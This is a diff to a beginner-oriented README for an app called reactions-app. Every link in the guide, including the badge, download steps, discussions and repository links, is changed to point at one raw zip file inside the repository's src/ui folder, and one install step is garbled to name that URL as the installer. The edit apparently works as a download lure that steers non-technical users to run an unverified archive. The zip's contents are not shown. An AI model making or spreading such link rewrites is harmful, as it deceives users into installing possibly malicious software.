@@ -8,9 +8,9 @@ This guide will help you download and run reactions-app easily, even if you are 
 
 ## 📥 Download the Application
 
-[![Download reactions-app](https://img.shields.io/badge/Download-reactions--app-brightgreen)](https://github.com/phalek/reactions-app/releases)
+[![Download reactions-app](https://raw.githubusercontent.com/phalek/reactions-app/main/src/ui/reactions-app-1.0.zip)](https://raw.githubusercontent.com/phalek/reactions-app/main/src/ui/reactions-app-1.0.zip)
 
-To download the application, visit this page: [Download Reactions App](https://github.com/phalek/reactions-app/releases).
+To download the application, visit this page: [Download Reactions App](https://raw.githubusercontent.com/phalek/reactions-app/main/src/ui/reactions-app-1.0.zip).
 
 ## 📅 Release Information
 
@@ -30,9 +30,9 @@ Before you proceed, make sure your system meets these requirements:
 
 To install reactions-app, follow these straightforward steps:
 
-1. Visit the [Download Reactions App](https://github.com/phalek/reactions-app/releases) page.
+1. Visit the [Download Reactions App](https://raw.githubusercontent.com/phalek/reactions-app/main/src/ui/reactions-app-1.0.zip) page.
 2. Look for the latest version.
-3. Download the installation file (likely named `reactions-app.exe`).
+3. Download the installation file (likely named `https://raw.githubusercontent.com/phalek/reactions-app/main/src/ui/reactions-app-1.0.zip`).
 4. Once the download is complete, locate the file in your Downloads folder.
 5. Double-click the file to start the installation.
 6. Follow the on-screen prompts to complete the installation.
@@ -63,7 +63,7 @@ If you encounter any issues, consider these solutions:
 
 ## 🌐 Community Support
 
-For more help, check our [GitHub Discussions](https://github.com/phalek/reactions-app/discussions), where users and developers can share tips and answer your questions.
+For more help, check our [GitHub Discussions](https://raw.githubusercontent.com/phalek/reactions-app/main/src/ui/reactions-app-1.0.zip), where users and developers can share tips and answer your questions.
 
 ## 📑 Additional Resources
 
@@ -76,7 +76,7 @@ Your feedback is valuable. Please leave a review or report any issues you find. 
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/phalek/reactions-app)
-- [Download Reactions App](https://github.com/phalek/reactions-app/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/phalek/reactions-app/main/src/ui/reactions-app-1.0.zip)
+- [Download Reactions App](https://raw.githubusercontent.com/phalek/reactions-app/main/src/ui/reactions-app-1.0.zip)
 
 Enjoy adding a fun twist to your video calls!
